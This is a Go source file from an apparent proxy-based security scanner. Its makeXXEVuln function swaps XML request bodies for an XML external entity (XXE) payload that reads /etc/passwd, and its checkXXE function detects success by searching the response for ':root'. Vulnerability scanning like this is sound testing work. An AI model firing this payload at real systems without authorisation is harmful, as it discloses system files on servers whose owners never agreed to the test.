package api

import (
	"bytes"
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/stepanpopov/proxy_scanner/internal/utils"
)

func doClientRequest(req *http.Request) (*http.Response, error) {
	return http.DefaultClient.Do(req)
}

func makeXXEVuln(ri *utils.RequestInfo) *utils.RequestInfo {
	if strings.Contains(ri.Body, "<?xml") {
		ri.Body = `
		<!DOCTYPE foo [
			<!ELEMENT foo ANY >
			<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<foo>&xxe;</foo>
		`
	}
	return ri
}

func checkXXE(r *http.Response) bool {
	b, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("failed to read bidy")
		return false
	}

	if bytes.Index(b, []byte(":root")) != -1 {
		return true
	}

	return false
}
